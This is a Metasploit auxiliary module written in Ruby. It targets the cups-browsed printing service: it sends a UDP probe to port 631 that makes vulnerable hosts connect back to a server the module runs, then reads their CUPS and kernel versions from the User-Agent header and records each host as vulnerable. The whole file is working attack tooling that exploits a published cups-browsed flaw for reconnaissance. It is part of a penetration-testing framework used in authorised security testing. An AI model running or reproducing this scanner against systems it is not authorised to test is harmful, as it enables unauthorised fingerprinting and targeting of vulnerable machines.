##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::UDPScanner
  include Msf::Exploit::Remote::HttpServer

  def initialize
    super(
      'Name' => 'cups-browsed Information Disclosure',
      'Description' => %q{
        Retrieve CUPS version and kernel version information from cups-browsed services.
      },
      'Author' => [
        'evilsocket', # discovery
        'bcoles' # msf
      ],
      'License' => MSF_LICENSE,
      'References' => [
        ['URL', 'https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8' ],
        ['URL', 'https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/' ],
      ],
      'DefaultOptions' => { 'RPORT' => 631 },
    )
    deregister_options('URIPATH')
  end

  def build_probe
    @probe ||= "0 3 #{get_uri}"
    @probe
  end

  def run
    start_service('Path' => "/printers/#{Rex::Text.rand_text_alphanumeric(10..16)}")
    super
  end

  def on_request_uri(cli, request)
    return if request.nil?

    info = request['User-Agent']

    return unless info.to_s.include?('CUPS')

    print_good("#{cli.peerhost}: #{info}")

    report_host(host: cli.peerhost)
    report_service(
      host: cli.peerhost,
      proto: 'udp',
      port: rport,
      name: 'cups-browsed',
      info: info
    )
    report_vuln({
      host: cli.peerhost,
      port: rport,
      proto: 'udp',
      name: 'cups-browsed Information Disclosure',
      refs: references
    })
  end
end
